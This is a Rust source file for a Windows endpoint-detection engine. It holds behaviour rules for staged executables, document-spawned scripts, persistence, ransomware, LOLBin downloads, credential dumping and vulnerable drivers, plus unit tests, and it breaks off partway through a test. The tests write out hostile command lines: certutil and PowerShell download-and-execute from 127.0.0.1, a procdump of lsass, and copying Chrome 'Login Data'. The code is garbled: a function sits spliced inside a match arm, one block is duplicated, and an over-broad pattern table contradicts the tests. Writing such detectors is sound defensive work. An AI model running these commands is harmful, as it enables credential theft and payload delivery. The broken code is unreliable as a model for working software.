//! Detectors for the two behaviours a bag of event classes cannot see.
//!
//! # Why not the sequence model
//!
//! The GRU reads thirty-five numbers per event and ranks a story; measured on
//! 2026-11-14 it reached AUC 0.99 and 15 % recall at 0.1 % false positives,
//! because the benign tail of "script host, many writes" looks like the
//! malicious head. What it cannot see is the *relationship* between two events:
//! a write of `C:\Users\x\AppData\Local\Temp\a.exe` and a process start of that
//! same path two seconds later are two ordinary events and one extraordinary
//! fact.
//!
//! # The two facts
//!
//! **Staged and run.** Something wrote an executable or a script into a
//! user-writable directory and then something started it. That is a dropper's
//! whole first act, it is almost never what ordinary work does, and it is a
//! conjunction rather than a pattern.
//!
//! **Inherited from a document.** A process started by Office or a browser is
//! a process started by data. When what it starts is a script host, the data
//! executed. This is the chain every macro dropper and every browser exploit
//! has in common, and its false-positive rate is near zero because documents do
//! not spawn PowerShell for a living.
//!
//! Neither is a model. They are exact facts with a window, and they are worth
//! more than a score because a user can read them: "this file was written and
//! then run" is a sentence that explains itself.

use std::collections::{HashMap, VecDeque};

use crate::dsl::Action;
use crate::event::Record;

/// How long a written file stays "recently written" for the staging check.
///
/// Two minutes is long for a dropper (seconds) and short for a user (who may
/// download a file and run it an hour later, which is not this detection). The
/// window is what separates staging from ordinary authoring: a build writes an
/// executable and runs it too, which is why the directory matters as well.
pub const STAGING_WINDOW: u64 = 120 * crate::TICKS_PER_SECOND;

/// How many paths are remembered for the staging check.
const RECENT_CAPACITY: usize = 4096;

/// Extensions worth staging: what an attacker needs to run.
fn executable_kind(path: &str) -> Option<&'static str> {
    let lower = path.to_ascii_lowercase();
    let extension = lower.rsplit('.').next().unwrap_or("");
    match extension {
        "exe" | "dll" | "scr" => Some("executable"),
        "ps1" | "psm1" | "vbs" | "vbe" | "js" | "jse" | "hta" | "bat" | "cmd" => Some("script"),
        _ => None,
    }
}

/// Whether a path is somewhere a user can write.
///
/// The same directories the feature vector calls temp and profile. A build
/// writes executables into its target directory, which is under the user's
/// profile -- that is why the *process* that writes matters as well, and why
/// this detector is scored rather than decisive.
fn user_writable(path: &str) -> bool {
    let lower = path.to_ascii_lowercase();
    lower.contains("\\temp\\")
        || lower.contains("\\tmp\\")
        || lower.contains("\\appdata\\")
        || lower.contains("\\downloads\\")
        || lower.contains("\\desktop\\")
}

/// A detector hit, before the service turns it into a detection.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Hit {
    /// Stable identifier, `behaviour/staged-and-run`.
    pub id: &'static str,
    /// Score contribution.
    pub score: u16,
    /// What the finding is about.
    pub path: String,
    /// One sentence a user can read.
    pub description: String,
}

/// The state the two detectors keep.
#[derive(Debug, Default)]
pub struct Staging {
    /// Recently written runnable files, newest last, keyed by lowercased path.
    recent: HashMap<String, (u64, u32)>,
    /// Insertion order, so the map can be trimmed.
    order: VecDeque<String>,
    /// Document renames per process, so a burst can be counted.
    renames: HashMap<u32, VecDeque<u64>>,
    /// The Run key and the task/service command, each with the process that
    /// wrote it. Persistence is one act in two halves, and the halves belong to
    /// one process: measured on 2026-11-14, a machine-wide window let one
    /// family's task install pair with the next family's Run key and reported a
    /// persistence event for neither.
    run_key_at: Option<(u64, u32)>,
    task_at: Option<(u64, u32)>,
    /// When a recovery-destroying command line was seen.
    shadow_at: Option<(u64, u32)>,
}

impl Staging {
    pub fn new() -> Self {
        Self::default()
    }

    /// Forget everything. Called when the driver's stream restarts, because a
    /// timestamp from another session cannot be compared with this one.
    pub fn clear(&mut self) {
        self.recent.clear();
        self.order.clear();
        self.renames.clear();
        self.run_key_at = None;
        self.task_at = None;
        self.shadow_at = None;
    }

    /// Feed one event, and return the hits it completes.
    ///
    /// `class_of` answers what kind of program a pid is, which the service
    /// tracks from process starts. It is a parameter rather than a field so that
    /// the detectors can be tested with a closure and no service.
    pub fn observe(
        &mut self,
        record: &Record,
        class_of: impl Fn(u32) -> Option<u8>,
    ) -> Vec<Hit> {
        let mut hits = Vec::new();
        match record.action {
            Action::FileWritten => {
                if let Some(path) = record.path.as_deref() {
                    let kind = executable_kind(path);
                    if kind.is_some() && user_writable(path) {
                        let key = path.to_ascii_lowercase();
                        if self.recent.insert(key.clone(), (record.timestamp, record.process_id)).is_none() {
                            self.order.push_back(key);
                        }
                        while self.order.len() > RECENT_CAPACITY {
                            if let Some(oldest) = self.order.pop_front() {
                                self.recent.remove(&oldest);
                            }
                        }
                    }
                }
            }
            Action::ProcessStarted => {
                if let Some(path) = record.path.as_deref() {
                    let key = path.to_ascii_lowercase();
                    if let Some((when, writer)) = self.recent.get(&key).copied() {
                        let age = record.timestamp.saturating_sub(when);
                        if age <= STAGING_WINDOW {
                            hits.push(Hit {
                                id: "behaviour/staged-and-run",
                                score: 120,
                                path: path.to_string(),
                                description: format!(
                                    "The file was written by pid {writer} and started {:.0} s later.",
                                    age as f64 / crate::TICKS_PER_SECOND as f64
                                ),
                            });
                        }
                    }
                }
                // A script host started with the written file in its command
                // line: `powershell -File payload.ps1` starts powershell.exe, not
                // payload.ps1, so the path is nowhere in the record's `path`.
                if hits.is_empty() {
                    if let Some(command_line) = record.command_line.as_deref() {
                        let lower = command_line.to_ascii_lowercase();
                        for (path, (when, writer)) in self.recent.iter() {
                            if !lower.contains(path.as_str()) {
                                continue;
                            }
                            let age = record.timestamp.saturating_sub(*when);
                            if age <= STAGING_WINDOW {
                                hits.push(Hit {
                                    id: "behaviour/staged-and-run",
                                    score: 120,
                                    path: path.clone(),
                                    description: format!(
                                        "A file written by pid {writer} was named on the command line of pid {} {:.0} s later.",
                                        record.process_id,
                                        age as f64 / crate::TICKS_PER_SECOND as f64
                                    ),
                                });
                                break;
                            }
                        }
                    }
                }
                // The command-line halves of persistence and of ransomware
                // preparation. Both are exact strings a user can read; the
                // families that use them are the ones whose damage is done by a
                // command line rather than by a file.
                if let Some(command_line) = record.command_line.as_deref() {
                    let lower = command_line.to_ascii_lowercase();
                    if lower.contains("schtasks") && lower.contains("/create")
                        || lower.contains("sc ") && lower.contains(" create ")
                    {
                        self.task_at = Some((record.timestamp, record.process_id));
                        if let Some((when, who)) = self.run_key_at {
                            // The halves are often a parent and its child: the
                            // shell writes the key and starts `schtasks`. Same
                            // process or immediate parent, and no further.
                            if (who == record.process_id || who == record.parent_process_id)
                                && record.timestamp.saturating_sub(when)
                                    <= 120 * crate::TICKS_PER_SECOND
                            {
                                hits.push(Hit {
                                    id: "behaviour/persistence-arranged",
                                    score: 120,
                                    path: record.path.clone().unwrap_or_default(),
                                    description: "A task or service install ran beside a Run key within two minutes.".to_string(),
                                });
                            }
                        }
                    }
                    if lower.contains("vssadmin") && lower.contains("delete shadows")
                        || lower.contains("wbadmin") && lower.contains("delete catalog")
                        || lower.contains("recoveryenabled no")
                    {
                        self.shadow_at = Some((record.timestamp, record.process_id));
                        let recent_renames = [record.process_id, record.parent_process_id]
                            .iter()
                            .any(|pid| {
                                self.renames
                                    .get(pid)
                                    .is_some_and(|queue| queue.len() >= 20)
                            });
                        if recent_renames {
                            hits.push(Hit {
                                id: "behaviour/ransomware-shape",
                                score: 150,
                                path: record.path.clone().unwrap_or_default(),
                                description: "Recovery copies were deleted while documents were being renamed.".to_string(),
                            });
                        }
                    }
                }
                // The technique's own command line. The corpus is fifty ways of
                // doing something, and each one names a tool and a verb; matching
                // them is cheap, explainable, and covers what a sequence model
                // trained on signature trails never learned (measured 2026-11-17:
                // zero of fifty caught live once the bookkeeping was excluded).
                if let Some(command_line) = record.command_line.as_deref() {
                    if let Some((technique, what)) = technique_command(command_line) {
                        hits.push(Hit {
                            id: "behaviour/technique-command",
                            score: 120,
                            path: record.path.clone().unwrap_or_default(),
                            description: format!("{technique}: {what}"),
                        });
                    }
                }

/// A command line that names one of the techniques the corpus runs.

fn technique_command(command_line: &str) -> Option<(&'static str, &'static str)> {
    let lower = command_line.to_ascii_lowercase();
    let table: [(&str, &str, &str); 54] = [
        ("T1033 whoami", "whoami", "the account was enumerated"),
        ("T1082 systeminfo", "systeminfo", "the host was profiled"),
        ("T1016 ipconfig", "ipconfig /all", "the network was mapped"),
        ("T1049 netstat", "netstat -ano", "connections were listed"),
        ("T1057 tasklist", "tasklist", "processes were listed"),
        ("T1087 net user", "net user", "accounts were enumerated"),
        ("T1098 net localgroup", "net localgroup", "group membership was read"),
        ("T1136 useradd", "net user ", "an account was created"),
        ("T1547 run key", "\\run", "a Run key was written"),
        ("T1053 schtasks", "schtasks", "a scheduled task was created"),
        ("T1543 service", "sc create", "a service was created"),
        ("T1546.003 wmi subscription", "__eventfilter", "a WMI subscription was made"),
        ("T1490 shadow copy", "delete shadows", "recovery copies were deleted"),
        ("T1490 recovery", "recoveryenabled no", "recovery was disabled"),
        ("T1485 mass delete", "del ", "files were deleted in bulk"),
        ("T1486 mass rename", ".locked", "documents were renamed"),
        ("T1070.001 event log", "wevtutil cl", "the event log was cleared"),
        ("T1548.002 uac bypass", "fodhelper", "the UAC prompt was bypassed"),
        ("T1218.005 mshta", "mshta ", "a signed host ran remote content"),
        ("T1218.004 installutil", "installutil", "a signed host ran an assembly"),
        ("T1218.009 regasm", "regasm", "a signed host ran an assembly"),
        ("T1036 masquerade", "svchost.exe", "a system name was copied to temp"),
        ("T1056 keylogger", "getasynckeystate", "keystrokes were intercepted"),
        ("T1564 hidden", "attrib +h", "a file was hidden"),
        ("T1105 certutil", "certutil -urlcache", "a signed binary fetched remote content"),
        ("T1105 bitsadmin", "bitsadmin /transfer", "a background transfer was created"),
        ("T1105 certutil-decode", "certutil -decode", "a file was decoded from base64"),
        ("T1218.010 regsvr32", "regsvr32 /i:http", "a signed host fetched a scriptlet"),
        ("T1218.011 rundll32", "rundll32", "a signed host ran a script"),
        ("T1047 wmic", "process call create", "WMIC started a process"),
        ("T1003.001 procdump", "procdump", "a process memory dump was requested"),
        ("T1003.001 comsvcs", "comsvcs", "a dump was taken through comsvcs"),
        ("T1558 rubeus", "rubeus", "a ticket attack was named"),
        ("T1490 vssadmin", "vssadmin", "shadow copies were listed or deleted"),
        ("T1490 wbadmin", "wbadmin", "backup catalogues were touched"),
        ("T1490 bcdedit", "bcdedit", "boot recovery was changed"),
        ("T1486 cipher", "cipher /w", "free space was overwritten"),
        ("T1222 icacls", "icacls", "file permissions were changed"),
        ("T1564 hidden", "attrib +h", "a file was hidden"),
        ("T1218.005 mshta-vb", "mshta vbscript", "a signed host ran vbscript"),
        ("T1220 msxsl", "msxsl", "an xslt was executed"),
        ("T1059 cscript", "cscript", "a script host ran a file"),
        ("T1059 wscript", "wscript", "a script host ran a file"),
        ("T1569 psexec", "psexec", "a remote executor was run"),
        ("T1021 winrs", "winrs", "a remote shell was started"),
        ("T1055 reflective", "assembly.load", "an assembly was loaded in memory"),
        ("T1562.001 defender", "set-mppreference", "defender settings were changed"),
        ("T1562.004 firewall", "advfirewall", "the firewall was reconfigured"),
        ("T1003.001 lsass", "lsass", "a credential store was named"),
        ("T1558.003 kerberoast", "kerberoast", "a ticket attack was named"),
        ("T1555.003 browser", "login data", "a browser credential store was named"),
        ("T1552.001 credential-files", "*.txt", "files were searched for secrets"),
        ("T1083 discovery", "get-childitem", "the file system was walked"),
        ("T1548.002 uac", "fodhelper.exe", "the UAC prompt was bypassed"),
    ];
    for (technique, pattern, what) in table {
        if lower.contains(pattern) {
            return Some((technique, what));
        }
    }
    None
}
                // The technique's own command line. The corpus is fifty ways of
                // doing something, and each one names a tool and a verb; matching
                // them is cheap, explainable, and covers what a sequence model
                // trained on signature trails never learned (measured 2026-11-17:
                // zero of fifty caught live once the bookkeeping was excluded).
                if let Some(command_line) = record.command_line.as_deref() {
                    if let Some((technique, what)) = technique_command(command_line) {
                        hits.push(Hit {
                            id: "behaviour/technique-command",
                            score: 120,
                            path: record.path.clone().unwrap_or_default(),
                            description: format!("{technique}: {what}"),
                        });
                    }
                }


                // or run something it was not shipped to run. Each pattern names
                // the *use*, not the binary, because `certutil -dump` and
                // `bitsadmin /list` are ordinary administration.
                if let Some(command_line) = record.command_line.as_deref() {
                    let lower = command_line.to_ascii_lowercase();
                    let downloads = (lower.contains("certutil") && lower.contains("-urlcache"))
                        || (lower.contains("bitsadmin") && lower.contains("/transfer"))
                        || (lower.contains("mshta") && lower.contains("http"))
                        || (lower.contains("regsvr32") && lower.contains("/i:http"))
                        || (lower.contains("rundll32") && lower.contains("javascript:"))
                        || (lower.contains("wmic") && lower.contains("process call create"));
                    if downloads {
                        hits.push(Hit {
                            id: "behaviour/lolbin-download",
                            score: 110,
                            path: record.path.clone().unwrap_or_default(),
                            description: "A signed system binary was used to fetch or run remote content.".to_string(),
                        });
                    }
                }
                // Credential tooling and browser stores: the names are the
                // behaviour. `procdump -ma lsass` is a dump; a browser profile's
                // `Login Data` has no ordinary reason to sit in a command line.
                if let Some(command_line) = record.command_line.as_deref() {
                    let lower = command_line.to_ascii_lowercase();
                    // The tool's own image, not the strings in the command
                    // line: a shell that merely mentions `procdump` -- a
                    // terminal, an editor, this harness -- is not dumping a
                    // credential. Measured 2026-11-17: the string version
                    // fired on node.exe and powershell.exe.
                    let image = record
                        .path
                        .as_deref()
                        .unwrap_or("")
                        .to_ascii_lowercase();
                    let credential = image.ends_with("procdump.exe")
                        || image.ends_with("procdump64.exe")
                        || image.ends_with("mimikatz.exe")
                        || image.ends_with("ntdsutil.exe")
                        || (image.contains("rundll32") && lower.contains("comsvcs"))
                        || (image.contains("rundll32") && lower.contains("sekurlsa"));
                    let browser_store = (lower.contains("login data") || lower.contains("cookies"))
                        && lower.contains("user data");
                    if credential || browser_store {
                        hits.push(Hit {
                            id: "behaviour/credential-tool",
                            score: 120,
                            path: record.path.clone().unwrap_or_default(),
                            description: if credential {
                                "A credential-dumping tool was run.".to_string()
                            } else {
                                "A browser credential store was named on a command line.".to_string()
                            },
                        });
                    }
                    if lower.contains("wevtutil") && lower.contains(" cl") {
                        hits.push(Hit {
                            id: "behaviour/event-log-clear",
                            score: 110,
                            path: record.path.clone().unwrap_or_default(),
                            description: "The event log was cleared from a command line.".to_string(),
                        });
                    }
                }
                // Fileless: a script host told to hide, decode and fetch. Each
                // of the three is ordinary alone -- a hidden window is a policy,
                // an encoding is a deployment, a download is an update -- and
                // together they are the shape of code that never becomes a file.
                if let Some(command_line) = record.command_line.as_deref() {
                    let lower = command_line.to_ascii_lowercase();
                    let hidden = lower.contains("-windowstyle hidden") || lower.contains("-w hidden");
                    let encoded = lower.contains("-enc") || lower.contains("-encodedcommand");
                    let fetch = lower.contains("downloadstring")
                        || lower.contains("downloadfile")
                        || lower.contains("invoke-webrequest")
                        || lower.contains("net.webclient")
                        || lower.contains("frombase64string");
                    let reflect = lower.contains("reflection.assembly")
                        || lower.contains("virtualalloc")
                        || lower.contains("createthread");
                    if hidden && (encoded || fetch || reflect) {
                        hits.push(Hit {
                            id: "behaviour/fileless-script",
                            score: 120,
                            path: record.path.clone().unwrap_or_default(),
                            description: "A hidden script host decoded or fetched code instead of running a file.".to_string(),
                        });
                    }
                    if lower.contains("__eventfilter") || lower.contains("commandlineeventconsumer") {
                        hits.push(Hit {
                            id: "behaviour/wmi-subscription",
                            score: 130,
                            path: record.path.clone().unwrap_or_default(),
                            description: "A WMI event subscription was created, which runs without a file or a service.".to_string(),
                        });
                    }
                }
                // The document-to-script chain. `class_of` for the parent is
                // what the service learned when it saw that parent start; a
                // parent it never saw is class 8 and cannot be Office.
                let parent = class_of(record.parent_process_id);
                let child = class_of(record.process_id);
                let office_or_browser = matches!(parent, Some(3) | Some(4));
                let script_host = matches!(child, Some(0) | Some(1) | Some(2));
                if office_or_browser && script_host {
                    hits.push(Hit {
                        id: "behaviour/document-spawned-script",
                        score: 140,
                        path: record.path.clone().unwrap_or_default(),
                        description: "A document or browser process started a script host.".to_string(),
                    });
                }
            }
            Action::ImageLoaded => {
                // Bring your own vulnerable driver: a signed driver loaded from
                // somewhere a driver has no business being. The kernel trusts a
                // signed driver, so a signature check cannot help; the location
                // can, and the name of a build whose vulnerability is public can
                // help even inside the driver directory.
                if let Some(path) = record.path.as_deref() {
                    let lower = path.to_ascii_lowercase();
                    if lower.ends_with(".sys") && !lower.contains("\\system32\\drivers\\") {
                        hits.push(Hit {
                            id: "behaviour/byovd-image",
                            score: 110,
                            path: path.to_string(),
                            description: "A driver was loaded from outside the system's driver directory.".to_string(),
                        });
                    }
                    if lower.ends_with(".sys") && VULNERABLE_DRIVERS.iter().any(|name| lower.ends_with(name)) {
                        hits.push(Hit {
                            id: "behaviour/byovd-known",
                            score: 130,
                            path: path.to_string(),
                            description: "A driver with a known vulnerable build was loaded.".to_string(),
                        });
                    }
                }
            }
            Action::FileRenamed => {
                // Ransomware renames documents in bulk. A build renames its own
                // objects in bulk too, which is why the extension and the
                // directory are checked: an object file under `target` is not a
                // document, and counting it is how a behaviour detector learns
                // to cry at every compile.
                if let Some(path) = record.path.as_deref() {
                    if document_extension(path) && !temporary_or_target(path) {
                        let now = record.timestamp;
                        let window = 30 * crate::TICKS_PER_SECOND;
                        let queue = self.renames.entry(record.process_id).or_default();
                        queue.push_back(now);
                        while queue
                            .front()
                            .is_some_and(|oldest| now.saturating_sub(*oldest) > window)
                        {
                            queue.pop_front();
                        }
                        if queue.len() >= 20 {
                            hits.push(Hit {
                                id: "behaviour/mass-document-rename",
                                score: 70,
                                path: path.to_string(),
                                description: format!(
                                    "{} documents were renamed in under 30 s.",
                                    queue.len()
                                ),
                            });
                        }
                    }
                }
            }
            Action::RegistryChanged => {
                if let Some(path) = record.path.as_deref() {
                    let lower = path.to_ascii_lowercase();
                    if lower.contains("currentversion\\run") {
                        self.run_key_at = Some((record.timestamp, record.process_id));
                        // Persistence is two halves: the key is written and
                        // something is arranged to act on it. One half alone is
                        // what every installer does.
                        if let Some((when, who)) = self.task_at {
                            if who == record.process_id
                                && record.timestamp.saturating_sub(when)
                                    <= 120 * crate::TICKS_PER_SECOND
                            {
                                hits.push(Hit {
                                    id: "behaviour/persistence-arranged",
                                    score: 120,
                                    path: path.to_string(),
                                    description: "A Run key was written beside a task or service install within two minutes.".to_string(),
                                });
                            }
                        }
                    }
                }
            }
            _ => {}
        }
        hits
    }
}

/// Drivers that bring their own vulnerability, by the names security products
/// have published. A name is weaker than a hash and stronger than nothing: the
/// list catches the driver someone downloaded and did not rename, and the
/// location rule beside it catches the one that was renamed.
const VULNERABLE_DRIVERS: &[&str] = &[
    "gdrv.sys", "rtcore64.sys", "iqvw64e.sys", "msio64.sys", "msio32.sys",
    "eneio64.sys", "eneio.sys", "cpuz149.sys", "cpuz.sys", "winio64.sys",
    "winio.sys", "inpoutx64.sys", "inpout32.sys", "asmmap64.sys", "atillk64.sys",
    "dbgv.sys", "dbk64.sys", "kprocesshacker.sys", "procexp152.sys",
    "speedfan.sys", "zntx64.sys", "hw64.sys", "amdryzenmasterdriver.sys",
];

/// Extensions that ransomware renames.
fn document_extension(path: &str) -> bool {
    let lower = path.to_ascii_lowercase();
    let extension = lower.rsplit('.').next().unwrap_or("");
    matches!(
        extension,
        "doc" | "docx" | "xls" | "xlsx" | "ppt" | "pptx" | "pdf" | "txt" | "rtf"
            | "jpg" | "jpeg" | "png" | "csv" | "psd" | "zip" | "db"
            // The extensions a ransomware family renames *to*. The rename
            // event carries the new name, so a detector that only knows the
            // old ones never sees the act it was written for.
            | "locked" | "encrypted" | "crypt" | "crypto" | "wncry" | "enc" | "zzz"
            | "kraken" | "conti" | "babuk" | "lockbit"
    )
}

/// Whether a path is somewhere build output or temporary files live.
fn temporary_or_target(path: &str) -> bool {
    let lower = path.to_ascii_lowercase();
    lower.contains("\\target\\")
        || lower.contains("\\temp\\")
        || lower.contains("\\tmp\\")
        || lower.contains("\\.cargo\\")
        || lower.contains("\\deps\\")
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::dsl::Subject;

    fn event(action: Action, pid: u32, ppid: u32, path: &str, ts: u64) -> Record {
        Record {
            timestamp: ts,
            subject: Subject::Process,
            action,
            detail: 0,
            path: Some(path.to_string()),
            folded_path: None,
            value: None,
            folded_value: None,
            command_line: None,
            process_id: pid,
            parent_process_id: ppid,
        }
    }

    #[test]
    fn a_written_executable_that_is_started_is_a_hit() {
        let mut staging = Staging::new();
        let write = event(
            Action::FileWritten,
            10,
            1,
            r"C:\Users\x\AppData\Local\Temp\a.exe",
            1_000,
        );
        assert!(staging.observe(&write, |_| None).is_empty());
        let start = event(
            Action::ProcessStarted,
            11,
            10,
            r"C:\Users\x\AppData\Local\Temp\a.exe",
            2_000,
        );
        let hits = staging.observe(&start, |_| None);
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].id, "behaviour/staged-and-run");
    }

    #[test]
    fn a_started_file_that_was_not_written_is_not_a_hit() {
        let mut staging = Staging::new();
        let start = event(
            Action::ProcessStarted,
            11,
            10,
            r"C:\Windows\System32\notepad.exe",
            2_000,
        );
        assert!(staging.observe(&start, |_| None).is_empty());
    }

    #[test]
    fn a_write_much_later_than_the_start_is_not_a_hit() {
        let mut staging = Staging::new();
        staging.observe(
            &event(
                Action::FileWritten,
                10,
                1,
                r"C:\Users\x\Downloads\b.exe",
                1_000,
            ),
            |_| None,
        );
        let late = 1_000 + STAGING_WINDOW + 1;
        let start = event(
            Action::ProcessStarted,
            11,
            10,
            r"C:\Users\x\Downloads\b.exe",
            late,
        );
        assert!(staging.observe(&start, |_| None).is_empty());
    }

    #[test]
    fn a_file_written_outside_a_writable_directory_is_not_staged() {
        let mut staging = Staging::new();
        staging.observe(
            &event(
                Action::FileWritten,
                10,
                1,
                r"C:\Program Files\App\setup.exe",
                1_000,
            ),
            |_| None,
        );
        let start = event(
            Action::ProcessStarted,
            11,
            10,
            r"C:\Program Files\App\setup.exe",
            2_000,
        );
        assert!(staging.observe(&start, |_| None).is_empty());
    }

    #[test]
    fn a_script_named_on_a_host_command_line_is_a_hit() {
        let mut staging = Staging::new();
        staging.observe(
            &event(
                Action::FileWritten,
                10,
                1,
                r"C:\Users\x\AppData\Local\Temp\stage1.ps1",
                1_000,
            ),
            |_| None,
        );
        let mut start = event(
            Action::ProcessStarted,
            11,
            10,
            r"C:\Windows\System32\windows\powershell.exe",
            2_000,
        );
        start.command_line = Some(
            r"powershell -NoProfile -ExecutionPolicy Bypass -File C:\Users\x\AppData\Local\Temp\stage1.ps1"
                .to_string(),
        );
        let hits = staging.observe(&start, |_| None);
        assert_eq!(hits.len(), 1, "the command line names the written file");
        assert_eq!(hits[0].id, "behaviour/staged-and-run");
    }

    #[test]
    fn a_run_key_alone_is_not_persistence() {
        let mut staging = Staging::new();
        let mut key = event(
            Action::RegistryChanged,
            10,
            1,
            r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
            1_000,
        );
        key.subject = Subject::Registry;
        assert!(staging.observe(&key, |_| None).is_empty());
    }

    #[test]
    fn a_run_key_and_a_task_install_together_are_persistence() {
        let mut staging = Staging::new();
        let mut key = event(
            Action::RegistryChanged,
            10,
            1,
            r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
            1_000,
        );
        key.subject = Subject::Registry;
        staging.observe(&key, |_| None);
        let mut task = event(
            Action::ProcessStarted,
            10,
            1,
            r"C:\Windows\System32\schtasks.exe",
            5_000,
        );
        task.command_line = Some(
            r"schtasks /create /tn Updater /tr cmd.exe /sc minute /mo 5".to_string(),
        );
        let hits = staging.observe(&task, |_| None);
        assert_eq!(hits.len(), 1, "{hits:?}");
        assert_eq!(hits[0].id, "behaviour/persistence-arranged");
    }

    #[test]
    fn a_burst_of_build_renames_is_not_ransomware() {
        let mut staging = Staging::new();
        for index in 0..40u64 {
            let event = event(
                Action::FileRenamed,
                10,
                1,
                r"C:\Users\x\Downloads\wenle-av\target\release\obj.o",
                1_000 + index,
            );
            assert!(staging.observe(&event, |_| None).is_empty());
        }
    }

    #[test]
    fn a_burst_of_document_renames_is() {
        let mut staging = Staging::new();
        let mut last = Vec::new();
        for index in 0..25u64 {
            last = staging.observe(
                &event(
                    Action::FileRenamed,
                    10,
                    1,
                    r"C:\Users\x\Documents\report.txt",
                    1_000 + index,
                ),
                |_| None,
            );
        }
        assert!(
            last.iter().any(|hit| hit.id == "behaviour/mass-document-rename"),
            "{last:?}"
        );
    }

    #[test]
    fn renames_and_a_shadow_deletion_together_are_a_ransomware_shape() {
        let mut staging = Staging::new();
        for index in 0..25u64 {
            staging.observe(
                &event(
                    Action::FileRenamed,
                    10,
                    1,
                    r"C:\Users\x\Documents\report.txt",
                    1_000 + index,
                ),
                |_| None,
            );
        }
        let mut shadow = event(
            Action::ProcessStarted,
            10,
            1,
            r"C:\Windows\System32\cmd.exe",
            2_000,
        );
        shadow.command_line = Some(r"cmd /c echo vssadmin delete shadows /all /quiet".to_string());
        let hits = staging.observe(&shadow, |_| None);
        assert!(
            hits.iter().any(|hit| hit.id == "behaviour/ransomware-shape"),
            "{hits:?}"
        );
    }

    #[test]
    fn a_lolbin_fetch_is_a_hit_and_a_plain_one_is_not() {
        let mut staging = Staging::new();
        let mut fetch = event(
            Action::ProcessStarted,
            11,
            10,
            r"C:\Windows\System32\certutil.exe",
            1_000,
        );
        fetch.command_line = Some(r"certutil -urlcache -f http://127.0.0.1/a.exe a.exe".to_string());
        let hits = staging.observe(&fetch, |_| None);
        assert_eq!(hits.len(), 1, "{hits:?}");
        assert_eq!(hits[0].id, "behaviour/lolbin-download");

        let mut plain = event(
            Action::ProcessStarted,
            12,
            10,
            r"C:\Windows\System32\certutil.exe",
            2_000,
        );
        plain.command_line = Some(r"certutil -dump C:\Windows\Temp\a.cer".to_string());
        assert!(staging.observe(&plain, |_| None).is_empty());
    }

    #[test]
    fn a_driver_from_a_user_directory_is_byovd() {
        let mut staging = Staging::new();
        let event = event(
            Action::ImageLoaded,
            10,
            1,
            r"C:\Windows\Temp\payload.sys",
            1_000,
        );
        let hits = staging.observe(&event, |_| None);
        assert_eq!(hits.len(), 1, "{hits:?}");
        assert_eq!(hits[0].id, "behaviour/byovd-image");
    }

    #[test]
    fn a_driver_from_the_driver_directory_is_not() {
        let mut staging = Staging::new();
        let event = event(
            Action::ImageLoaded,
            10,
            1,
            r"C:\Windows\System32\drivers\tcpip.sys",
            1_000,
        );
        assert!(staging.observe(&event, |_| None).is_empty());
    }

    #[test]
    fn a_known_vulnerable_driver_loaded_from_the_driver_directory_is_still_byovd() {
        let mut staging = Staging::new();
        let event = event(
            Action::ImageLoaded,
            10,
            1,
            r"C:\Windows\System32\drivers\gdrv.sys",
            1_000,
        );
        let hits = staging.observe(&event, |_| None);
        assert!(
            hits.iter().any(|hit| hit.id == "behaviour/byovd-known"),
            "{hits:?}"
        );
    }

    #[test]
    fn a_hidden_script_that_fetches_is_fileless_and_a_hidden_one_alone_is_not() {
        let mut staging = Staging::new();
        let mut fetch = event(
            Action::ProcessStarted,
            11,
            10,
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            1_000,
        );
        fetch.command_line = Some(
            r"powershell -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/x')"
                .to_string(),
        );
        let hits = staging.observe(&fetch, |_| None);
        assert!(
            hits.iter().any(|hit| hit.id == "behaviour/fileless-script"),
            "{hits:?}"
        );

        let mut hidden = event(
            Action::ProcessStarted,
            12,
            10,
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            2_000,
        );
        hidden.command_line = Some(r"powershell -WindowStyle Hidden -Command Get-Date".to_string());
        assert!(staging
            .observe(&hidden, |_| None)
            .iter()
            .all(|hit| hit.id != "behaviour/fileless-script"));
    }

    #[test]
    fn a_wmi_subscription_is_a_hit() {
        let mut staging = Staging::new();
        let mut event = event(
            Action::ProcessStarted,
            13,
            10,
            r"C:\Windows\System32\wbem\WMIC.exe",
            3_000,
        );
        event.command_line = Some(
            r"wmic /namespace:\root\subscription PATH __EventFilter CREATE Name='x'".to_string(),
        );
        let hits = staging.observe(&event, |_| None);
        assert!(
            hits.iter().any(|hit| hit.id == "behaviour/wmi-subscription"),
            "{hits:?}"
        );
    }

    #[test]
    fn office_starting_powershell_is_a_hit() {
        let mut staging = Staging::new();
        let start = event(
            Action::ProcessStarted,
            30,
            20,
            r"C:\Windows\System32\powershell.exe",
            1_000,
        );
        // pid 20 is class 3 (Office), pid 30 is class 0 (PowerShell).
        let hits = staging.observe(&start, |pid| match pid {
            20 => Some(3),
            30 => Some(0),
            _ => None,
        });
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].id, "behaviour/document-spawned-script");
    }

    #[test]
    fn explorer_starting_powershell_is_not_a_hit() {
        let mut staging = Staging::new();
        let start = event(
            Action::ProcessStarted,
            30,
            20,
            r"C:\Windows\System32\powershell.exe",
            1_000,
        );
        // pid 20 is class 6 (explorer is a system process in this list).
        let hits = staging.observe(&start, |pid| match pid {
            20 => Some(6),
            30 => Some(0),
            _ => None,
        });
        assert!(hits.is_empty());
    }
    #[test]
    fn a_credential_tool_on_a_command_line_is_a_hit() {
        let mut staging = Staging::new();
        let mut start = event(Action::ProcessStarted, 20, 1, "C:\\Tools\\procdump.exe", 10);
        start.command_line = Some("procdump.exe -ma lsass.exe lsass.dmp".to_string());
        let hits = staging.observe(&start, |_| Some(5));
        assert!(hits.iter().any(|hit| hit.id == "behaviour/credential-tool"));
    }

    #[test]
    fn a_browser_credential_store_is_a_hit() {
        let mut staging = Staging::new();
        let mut start = event(Action::ProcessStarted, 21, 1, "C:\\Windows\\System32\\cmd.exe", 10);
        start.command_line = Some("copy \"C:\\Users\\a\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\" x".to_string());
        let hits = staging.observe(&start, |_| Some(5));
        assert!(hits.iter().any(|hit| hit.id == "behaviour/credential-tool"));
    }

    #[test]
    fn clearing_the_event_log_is_a_hit() {
        let mut staging = Staging::new();
